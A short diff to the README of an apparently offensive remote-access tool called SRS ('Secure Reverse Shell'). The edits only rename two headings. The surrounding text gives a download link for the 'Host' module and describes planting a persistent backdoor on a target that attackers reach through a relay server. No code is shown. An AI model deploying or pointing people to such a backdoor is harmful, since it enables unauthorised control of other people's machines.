@@ -27,7 +27,7 @@ Thank you for respecting the intellectual property rights of KAS Productions.
 
 ---
 
-## Modules of SRS
+## Modules belonging to the SRS Pack
 
 **SRS Host** - <https://github.com/GlitchieTheDev/srs-server/releases/download/Host-v2.9.4/srs.zip>
 \
@@ -37,7 +37,7 @@ Thank you for respecting the intellectual property rights of KAS Productions.
 
 ---
 
-## What is SRS?
+## What is SRS Pack?
 SRS stands for Secure Reverse Shell which starts an "always open" vulnerability on a target (Host) which can then be connected to via an attacker (Client). A connection middleware (Server) is online where one can use the Client Module to connect to any system having the Host Module up and running. Find active hosts on the Server Module.
 
 ---
